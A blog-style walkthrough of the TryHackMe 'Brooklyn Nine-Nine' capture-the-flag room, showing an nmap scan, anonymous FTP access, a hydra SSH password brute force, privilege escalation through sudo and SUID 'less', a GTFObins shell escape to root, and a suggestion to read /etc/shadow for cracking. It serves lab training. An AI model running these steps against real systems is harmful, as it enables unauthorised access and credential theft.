---
title: "Brooklyn Nine-Nine Walkthrough"
date: 2022-04-22T15:06:28
lastmod: 2022-04-22T17:06:29
draft: false
description: "A walkthrough to the Brooklyn Nine-Nine Room on TryHackMe."

tags: ["hacking", "web", "walkthrough", "privesc"]
categories: ["TryHackMe Walkthroughs"]

---

# Brooklyn Nine-Nine Room
This is a brief walkthrough to the Brooklyn Nine-Nine Room on [TryHackMe]( https://tryhackme.com/room/brooklynninenine)

## Enumeration

### Nmap
```
root@ip-10-10-184-59:~# nmap -sV 10.10.9.108

Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-23 00:07 BST
Nmap scan report for ip-10-10-9-108.eu-west-1.compute.internal (10.10.9.108)
Host is up (0.00098s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:97:F2:6B:1B:69 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds
```

### FTP
Let's begin with the first port and check for anonymous FTP

```
root@ip-10-10-184-59:~/Downloads# ftp 10.10.9.108
Connected to 10.10.9.108.
220 (vsFTPd 3.0.3)
Name (10.10.9.108:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
```

Now let's see what the note says:

```
From Amy,

Jake, please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

## Exploitation
With that note, let's try to brute force the password for Jake's SSH account

```
root@ip-10-10-184-59:~/Tools/wordlists# hydra -l jake -P ./rockyou.txt ssh://10.10.9.108 -v -t4
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

[22][ssh] host: 10.10.9.108   login: jake   password: {omitted}

```

Now we will find the user flag, however, there is not any in Jake's directory - so let's explore other users’ directories by going to /home. 

We can find the flag in /home/holt.

## Privilege Escalation
Now we will check to see commands that Jake can run as root:

```
jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

So we can use the less command as root. As less can read files, we will just use sudo in front of it, so `sudo less /root/root.txt`.

## Privilege Escalation 2
The challenge mentions there are two ways to find the flag, so let’s try to discover the second way. First search for SUID files using `find / -perm /4000 2>/dev/null`. From this, we find that /bin/less has the sticky bit set, therefore, we can use `/bin/less /root/root.txt` to read the flag.

## Persistence
From the above two privilege escalation steps, we are still unable to effectively run commands as the root user. This can be changed using one of the following methods:

- [GTFObins](https://gtfobins.github.io/gtfobins/less/#sudo) provides a solution to escalate to root. Open any file with the less command, then type `!/bin/sh` to spawn a root privileged shell (see below):

```
jake@brookly_nine_nine:/home/holt$ sudo less /root/root.txt
# ls
nano.save  user.txt
# whoami
root
```

- As you can read any file, you could read the /etc/shadow and /etc/passwd files and attempt to crack the passwords (Nb: this will only work if a weak password has been set).
